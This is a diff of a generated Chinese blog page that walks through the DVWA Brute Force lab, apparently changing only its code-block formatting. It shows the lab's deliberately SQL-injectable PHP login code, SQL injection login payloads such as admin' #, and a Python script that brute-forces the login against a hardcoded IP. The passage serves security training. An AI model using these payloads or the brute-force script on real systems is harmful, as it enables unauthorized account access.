@@ -27,10 +27,9 @@
     <link rel="stylesheet" type="text/css" href="/css/matery.css">
     <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+    <script src="/libs/jquery/jquery.min.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+</head>
 
 
 
@@ -503,14 +502,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.5k
+                    4.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    17 分
+                    21 分
                 </div>
                 
 
@@ -537,74 +536,74 @@
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_FailedLogin.png" alt="BruteForce_FailedLogin"></center>
 
 <p>​        BruteForce模块的index.php代码：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre><code class="php">&lt;?php
 
-<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DVWA_WEB_PAGE_TO_ROOT'</span><span class="token punctuation">,</span> <span class="token string">'../../'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">require_once</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token punctuation">.</span> <span class="token string">'dvwa/includes/dvwaPage.inc.php'</span><span class="token punctuation">;</span>
+define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );
+require_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;
 
-<span class="token function">dvwaPageStartup</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string">'authenticated'</span><span class="token punctuation">,</span> <span class="token string">'phpids'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+dvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );
 
-<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token function">dvwaPageNewGrab</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'title'</span> <span class="token punctuation">]</span>   <span class="token operator">=</span> <span class="token string">'Vulnerability: Brute Force'</span> <span class="token punctuation">.</span> <span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'title_separator'</span> <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'title'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'page_id'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'brute'</span><span class="token punctuation">;</span>
-<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'help_button'</span> <span class="token punctuation">]</span>   <span class="token operator">=</span> <span class="token string">'brute'</span><span class="token punctuation">;</span>
-<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'source_button'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'brute'</span><span class="token punctuation">;</span>
-<span class="token function">dvwaDatabaseConnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$page = dvwaPageNewGrab();
+$page[ &#39;title&#39; ]   = &#39;Vulnerability: Brute Force&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];
+$page[ &#39;page_id&#39; ] = &#39;brute&#39;;
+$page[ &#39;help_button&#39; ]   = &#39;brute&#39;;
+$page[ &#39;source_button&#39; ] = &#39;brute&#39;;
+dvwaDatabaseConnect();
 
-<span class="token variable">$method</span>            <span class="token operator">=</span> <span class="token string">'GET'</span><span class="token punctuation">;</span>
-<span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-<span class="token keyword">switch</span><span class="token punctuation">(</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span> <span class="token string">'security'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">case</span> <span class="token string">'low'</span><span class="token punctuation">:</span>
-        <span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">'low.php'</span><span class="token punctuation">;</span>
-        <span class="token keyword">break</span><span class="token punctuation">;</span>
-    <span class="token keyword">case</span> <span class="token string">'medium'</span><span class="token punctuation">:</span>
-        <span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">'medium.php'</span><span class="token punctuation">;</span>
-        <span class="token keyword">break</span><span class="token punctuation">;</span>
-    <span class="token keyword">case</span> <span class="token string">'high'</span><span class="token punctuation">:</span>
-        <span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">'high.php'</span><span class="token punctuation">;</span>
-        <span class="token keyword">break</span><span class="token punctuation">;</span>
-    <span class="token keyword">default</span><span class="token punctuation">:</span>
-        <span class="token variable">$vulnerabilityFile</span> <span class="token operator">=</span> <span class="token string">'impossible.php'</span><span class="token punctuation">;</span>
-        <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token string">'POST'</span><span class="token punctuation">;</span>
-        <span class="token keyword">break</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+$method            = &#39;GET&#39;;
+$vulnerabilityFile = &#39;&#39;;
+switch( $_COOKIE[ &#39;security&#39; ] ) {
+    case &#39;low&#39;:
+        $vulnerabilityFile = &#39;low.php&#39;;
+        break;
+    case &#39;medium&#39;:
+        $vulnerabilityFile = &#39;medium.php&#39;;
+        break;
+    case &#39;high&#39;:
+        $vulnerabilityFile = &#39;high.php&#39;;
+        break;
+    default:
+        $vulnerabilityFile = &#39;impossible.php&#39;;
+        $method = &#39;POST&#39;;
+        break;
+}
 
-<span class="token keyword">require_once</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token punctuation">.</span> <span class="token string">"vulnerabilities/brute/source/{$vulnerabilityFile}"</span><span class="token punctuation">;</span>
+require_once DVWA_WEB_PAGE_TO_ROOT . &quot;vulnerabilities/brute/source/{$vulnerabilityFile}&quot;;
 
-<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'body'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> "
-<span class="token markup">&lt;div class=\"body_padded\"></span>
-    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Vulnerability<span class="token punctuation">:</span> Brute Force<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
+$page[ &#39;body&#39; ] .= &quot;
+&lt;div class=\&quot;body_padded\&quot;&gt;
+    &lt;h1&gt;Vulnerability: Brute Force&lt;/h1&gt;
 
-    <span class="token markup">&lt;div class=\"vulnerable_code_area\"></span>
-        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>Login<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
+    &lt;div class=\&quot;vulnerable_code_area\&quot;&gt;
+        &lt;h2&gt;Login&lt;/h2&gt;
 
-        <span class="token markup">&lt;form action=\"#\" method=\"{$method}\"></span>
-            Username<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>
-            <span class="token markup">&lt;input type=\"text\" name=\"username\"></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>
-            Password<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>
-            <span class="token markup">&lt;input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password\"></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>
-            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>
-            <span class="token markup">&lt;input type=\"submit\" value=\"Login\" name=\"Login\"></span>\<span class="token package">n</span>"<span class="token punctuation">;</span>
+        &lt;form action=\&quot;#\&quot; method=\&quot;{$method}\&quot;&gt;
+            Username:&lt;br /&gt;
+            &lt;input type=\&quot;text\&quot; name=\&quot;username\&quot;&gt;&lt;br /&gt;
+            Password:&lt;br /&gt;
+            &lt;input type=\&quot;password\&quot; AUTOCOMPLETE=\&quot;off\&quot; name=\&quot;password\&quot;&gt;&lt;br /&gt;
+            &lt;br /&gt;
+            &lt;input type=\&quot;submit\&quot; value=\&quot;Login\&quot; name=\&quot;Login\&quot;&gt;\n&quot;;
 
-<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$vulnerabilityFile</span> <span class="token operator">==</span> <span class="token string">'high.php'</span> <span class="token operator">||</span> <span class="token variable">$vulnerabilityFile</span> <span class="token operator">==</span> <span class="token string">'impossible.php'</span> <span class="token punctuation">)</span>
-    <span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'body'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"            "</span> <span class="token punctuation">.</span> <span class="token function">tokenField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+if( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )
+    $page[ &#39;body&#39; ] .= &quot;            &quot; . tokenField();
 
-<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string">'body'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> "
-        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
-        <span class="token punctuation">{</span><span class="token variable">$html</span><span class="token punctuation">}</span>
-    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
+$page[ &#39;body&#39; ] .= &quot;
+        &lt;/form&gt;
+        {$html}
+    &lt;/div&gt;
 
-    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>More Information<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
-    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span></span>
-        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>" <span class="token punctuation">.</span> <span class="token function">dvwaExternalLinkUrlGet</span><span class="token punctuation">(</span> 'https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)' ) . "&lt;/li></span>
-        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>" <span class="token punctuation">.</span> <span class="token function">dvwaExternalLinkUrlGet</span><span class="token punctuation">(</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password' ) . "&lt;/li></span>
-        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>" <span class="token punctuation">.</span> <span class="token function">dvwaExternalLinkUrlGet</span><span class="token punctuation">(</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html' ) . "&lt;/li></span>
-    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>
-<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>\<span class="token package">n</span>"<span class="token punctuation">;</span>
+    &lt;h2&gt;More Information&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)&#39; ) . &quot;&lt;/li&gt;
+        &lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password&#39; ) . &quot;&lt;/li&gt;
+        &lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html&#39; ) . &quot;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/div&gt;\n&quot;;
 
-<span class="token function">dvwaHtmlEcho</span><span class="token punctuation">(</span> <span class="token variable">$page</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+dvwaHtmlEcho( $page );
 
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 <p>​        可以看到，只有Impossible级别使用了<code>POST</code>提交方式，其他三种级别均是以<code>GET</code>方式进行提交的。</p>
 <h1 id="0x02-测试工具"><a href="#0x02-测试工具" class="headerlink" title="0x02 测试工具"></a>0x02 测试工具</h1><ul>
 <li>Firefox</li>
@@ -614,38 +613,38 @@
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre><code class="php">&lt;?php
 
-<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token comment" spellcheck="true">// Get username</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
+if( isset( $_GET[ &#39;Login&#39; ] ) ) {
+    // Get username
+    $user = $_GET[ &#39;username&#39; ];
 
-    <span class="token comment" spellcheck="true">// Get password</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Get password
+    $pass = $_GET[ &#39;password&#39; ];
+    $pass = md5( $pass );
 
-    <span class="token comment" spellcheck="true">// Check the database</span>
-    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span><span class="token punctuation">;</span>
-    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Check the database
+    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
 
-    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">// Get users details</span>
-        <span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[&quot;avatar&quot;];
 
-        <span class="token comment" spellcheck="true">// Login successful</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Welcome to the password protected area {$user}&lt;/p>"</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;img src=\"{$avatar}\" />"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">// Login failed</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
+        // Login successful
+        echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;
+        echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;
+    }
+    else {
+        // Login failed
+        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;
+    }
 
-    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
 
-<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt; </code></pre>
 <p>​        可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞[^【2】]。</p>
 <p><strong>漏洞利用</strong>：</p>
 <p><strong>方法一：BurpSuite爆破</strong></p>
@@ -676,57 +675,57 @@
 <p><strong>方法二：手工SQL注入</strong></p>
 <ul>
 <li><p>登录时用到的SQL</p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">`</span>users<span class="token punctuation">`</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span> <span class="token string">'$user'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'$pass'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="sql">SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;</code></pre>
 </li>
 <li><p>SQL注入设计</p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">`</span>users<span class="token punctuation">`</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token comment" spellcheck="true"># AND password = '$pass';</span>
-<span class="token keyword">user</span>:admin' <span class="token comment" spellcheck="true">#</span>
-password:<span class="token punctuation">(</span>空<span class="token punctuation">)</span>
+<pre><code class="sql">SELECT * FROM `users` WHERE user = &#39;admin&#39; # AND password = &#39;$pass&#39;;
+user:admin&#39; #
+password:(空)
 
-<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">`</span>users<span class="token punctuation">`</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'$pass'</span><span class="token punctuation">;</span>
-<span class="token keyword">user</span>:admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>
-password:<span class="token punctuation">(</span>空<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+SELECT * FROM `users` WHERE user = &#39;admin&#39; or &#39;1&#39;=&#39;1&#39; AND password = &#39;$pass&#39;;
+user:admin&#39; or &#39;1&#39;=&#39;1
+password:(空)</code></pre>
 </li>
 </ul>
 <p><strong>方法三：自编Python脚本暴力破解</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Version: python3</span>
-<span class="token comment" spellcheck="true"># Author: Silence</span>
-<span class="token comment" spellcheck="true"># Encoding: utf-8</span>
+<pre><code class="python"># Version: python3
+# Author: Silence
+# Encoding: utf-8
 
-<span class="token keyword">import</span> os
-<span class="token keyword">import</span> requests
+import os
+import requests
 
-BASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-<span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fhandler<span class="token punctuation">:</span>
-        <span class="token keyword">yield</span> <span class="token keyword">from</span> fhandler
+def read_file(path):
+    with open(path,&#39;r&#39;) as fhandler:
+        yield from fhandler
 
-<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    url <span class="token operator">=</span> <span class="token string">'http://{0}:{1}/dvwa/vulnerabilities/brute/'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>
-    params <span class="token operator">=</span> <span class="token punctuation">{</span>
-        <span class="token string">'username'</span> <span class="token punctuation">:</span> username<span class="token punctuation">,</span>
-        <span class="token string">'password'</span> <span class="token punctuation">:</span> password<span class="token punctuation">,</span>
-        <span class="token string">'Login'</span> <span class="token punctuation">:</span> <span class="token string">'Login'</span>
-    <span class="token punctuation">}</span>
+def brute_force(addr,username,password,headers):
+    url = &#39;http://{0}:{1}/dvwa/vulnerabilities/brute/&#39;.format(*addr)
+    params = {
+        &#39;username&#39; : username,
+        &#39;password&#39; : password,
+        &#39;Login&#39; : &#39;Login&#39;
+    }
 
-    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok <span class="token operator">and</span> \
-        response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'Welcome to the password protected area'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>
+    response = requests.get(url,params,headers=headers)
+    if response.ok and \
+        response.text.find(&#39;Welcome to the password protected area&#39;) != -1:
+        print(&#39;+&#39;,username,password)
 
-<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> username <span class="token keyword">in</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'username.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> password <span class="token keyword">in</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'password.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            brute_force<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>username<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>headers<span class="token punctuation">)</span>
+def main(addr,headers):
+    for username in read_file(os.path.join(BASE_DIR,&#39;username.txt&#39;)):
+        for password in read_file(os.path.join(BASE_DIR,&#39;password.txt&#39;)):
+            brute_force(addr,username.strip(),password.strip(),headers)
 
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    server <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'124.70.137.227'</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
-    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
-        <span class="token string">'Cookie'</span> <span class="token punctuation">:</span> <span class="token string">'security=low; PHPSESSID=atp0ssp267g2cgum8rvndgr855'</span>
-    <span class="token punctuation">}</span>
-    main<span class="token punctuation">(</span>server<span class="token punctuation">,</span>headers<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if __name__ == &#39;__main__&#39;:
